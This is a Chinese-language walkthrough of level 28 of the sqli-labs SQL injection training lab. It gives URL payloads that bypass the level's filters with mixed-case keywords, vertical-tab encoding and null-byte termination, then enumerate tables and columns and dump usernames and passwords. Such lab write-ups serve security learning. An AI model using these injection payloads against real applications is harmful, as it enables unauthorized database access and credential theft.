---
title: Less - 28
date: 2023-03-16T15:03:11Z
lastmod: 2023-03-16T15:17:46Z
---

# Less - 28

---

# 通关教程

---

## 1、判断闭合

---

查看源码，发现存在过滤

​![image](assets/image-20230316151011-7oijpka.png)​

这里发现基本与27关一样，依然采用大小写混合绕过

​![image](assets/image-20230316151103-a0imkh6.png)​

---

## 2、查看当前数据库

---

```http
http://192.168.225.132/sqli-labs/Less-28/?id=111')%0BUniON%0BsElect%0B1,2,database();%00
```

​![image](assets/image-20230316151343-nb23zxf.png)​

---

## 3、查看security库下的所有表

---

```http
http://192.168.225.132/sqli-labs/Less-28/?id=111')%0BUniON%0BsElect%0B1,2,(select (group_concat(table_name)) from (information_schema.tables) where (table_schema='security'));%00
```

​![image](assets/image-20230316151426-jndu6uu.png)​

---

## 4、查看users表下的所有字段

---

```http
http://192.168.225.132/sqli-labs/Less-28/?id=111')%0BUniON%0BsElect%0B1,2,(select (group_concat(column_name)) from (information_schema.columns) where (table_name='users'));%00
```

​![image](assets/image-20230316151649-x23o2gq.png)​

---

## 5、查看username,password字段的值

---

```http
http://192.168.225.132/sqli-labs/Less-28/?id=111')%0BUniON%0BsElect%0B1,2,(select (group_concat(username,password)) from (security.users));%00
```

​![image](assets/image-20230316151737-m53or1p.png)​

‍
